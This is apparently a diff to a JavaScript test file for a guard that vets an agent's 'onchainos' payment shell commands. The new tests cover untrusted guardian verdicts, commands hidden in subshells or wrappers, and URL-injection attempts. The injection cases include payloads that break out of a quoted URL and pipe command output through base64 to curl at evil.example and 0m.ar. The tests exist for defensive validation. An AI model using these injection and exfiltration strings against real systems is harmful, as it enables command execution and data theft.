@@ -20,10 +20,11 @@ const DOMAIN = 'pay_ad5fac02b8034bc2a84f6a3b';
 function world(verdicts) {
   const states = { [HONEST]: F('state-honest'), [BAIT]: F('state-price-bait'), [DOMAIN]: F('state-wrong-domain') };
   const ledgers = {};
-  for (const [id, verdict] of Object.entries(verdicts || {})) {
-    ledgers[id] = { paymentId: id, selectedIndex: 0, fingerprint: binding.fingerprint(binding.normalizeQuote(states[id]), 0), verdict, reasons: verdict === 'ALLOW' ? [] : ['some_rule'], summary: 'Quote ' + id + ': test summary.' };
+  for (const [id, spec] of Object.entries(verdicts || {})) {
+    const s = typeof spec === 'string' ? { verdict: spec } : spec;
+    ledgers[id] = { paymentId: id, selectedIndex: 0, fingerprint: binding.fingerprint(binding.normalizeQuote(states[id]), 0), verdict: s.verdict, reasons: s.verdict === 'ALLOW' ? [] : ['some_rule'], summary: 'Quote ' + id + ': test summary.', guardian: s.guardian || 'local', listingCompared: s.listingCompared !== false };
   }
-  return { states, ledgers, opts: { env: {}, allowAutopay: false, readState: (id) => states[id] || null, readLedger: (id) => ledgers[id] || null } };
+  return { states, ledgers, opts: { env: {}, allowAutopay: false, trustedGuardians: new Set(['local', 'https://guardian-mcp-rho.vercel.app']), readState: (id) => states[id] || null, readLedger: (id) => ledgers[id] || null } };
 }
 
 test('guard-policy: commands without onchainos get no opinion', () => {
@@ -84,6 +85,48 @@ test('guard-policy: a changed index or a changed persisted entry breaks the bind
   assert.equal(evaluateCommand('onchainos payment pay --payment-id ' + HONEST + ' --selected-index 1', w.opts).rule, 'pay_index_changed');
   w.states[HONEST].raw_accepts[0].payTo = '0x5b0c6a8d2e41f97b3c0d18e6a4f2b95c7d3e1a09';
   assert.equal(evaluateCommand('onchainos payment pay --payment-id ' + HONEST + ' --selected-index 0', w.opts).rule, 'pay_state_changed');
+});
+
+test('guard-policy: a verdict from an untrusted guardian, and an ALLOW with no listing compared, are not honored', () => {
+  const w = world({ [HONEST]: { verdict: 'ALLOW', guardian: 'https://evil.example' } });
+  const untrusted = evaluateCommand('onchainos payment pay --payment-id ' + HONEST + ' --selected-index 0', w.opts);
+  assert.equal(untrusted.decision, 'deny');
+  assert.equal(untrusted.rule, 'pay_untrusted_guardian');
+  const w2 = world({ [HONEST]: { verdict: 'ALLOW', listingCompared: false } });
+  const nolisting = evaluateCommand('onchainos payment pay --payment-id ' + HONEST + ' --selected-index 0 --yes', Object.assign({}, w2.opts, { allowAutopay: true }));
+  assert.equal(nolisting.decision, 'ask');
+  assert.equal(nolisting.rule, 'pay_no_listing');
+});
+
+test('guard-policy: onchainos inside $(...), backticks, a subshell or a bash -c wrapper is still checked', () => {
+  const w = world({ [BAIT]: 'DENY' });
+  for (const cmd of [
+    'OUT=$(onchainos payment pay --payment-id ' + BAIT + ' --selected-index 0 --yes); echo "$OUT"',
+    'echo `onchainos payment pay --payment-id ' + BAIT + ' --yes`',
+    '(onchainos payment pay --payment-id ' + BAIT + ' --yes)',
+    'bash -c "onchainos payment pay --payment-id ' + BAIT + ' --yes"',
+    'n=$(grep -c "(" notes.txt); onchainos payment pay --payment-id ' + BAIT + ' --yes',
+  ]) {
+    assert.equal((evaluateCommand(cmd, w.opts) || {}).decision, 'deny', cmd);
+  }
+});
+
+test('guard-policy: a quoted endpoint that closes the quote and trails a shell payload is denied', () => {
+  const { opts } = world();
+  for (const cmd of [
+    "onchainos payment quote 'https://evil.example/api';id|{base64,-w0}|{curl,-fsS,https://evil.example};#",
+    'onchainos payment quote "https://evil.example/api";id;#',
+    "onchainos payment quote 'https://0m.ar/api/market-insight;id|{base64,-w0}|{curl,-fsS,https://0m.ar/rce};#'",
+  ]) {
+    assert.equal((evaluateCommand(cmd, opts) || {}).rule, 'endpoint_url_injection', cmd);
+  }
+});
+
+test('guard-policy: PowerShell stop-parsing and line continuations do not hide the payment id', () => {
+  const w = world({ [BAIT]: 'DENY' });
+  assert.equal((evaluateCommand('onchainos payment pay --% --payment-id ' + BAIT + ' --yes', w.opts) || {}).decision, 'deny');
+  assert.equal((evaluateCommand('onchainos payment pay `\n  --payment-id ' + BAIT + ' `\n  --yes', w.opts) || {}).decision, 'deny');
+  assert.equal((evaluateCommand('onchainos payment pay \\\n  --payment-id ' + BAIT + ' --yes', w.opts) || {}).decision, 'deny');
 });
 
 test('guard-policy: sign-only and raw-key payments are denied, unchecked payment types ask', () => {
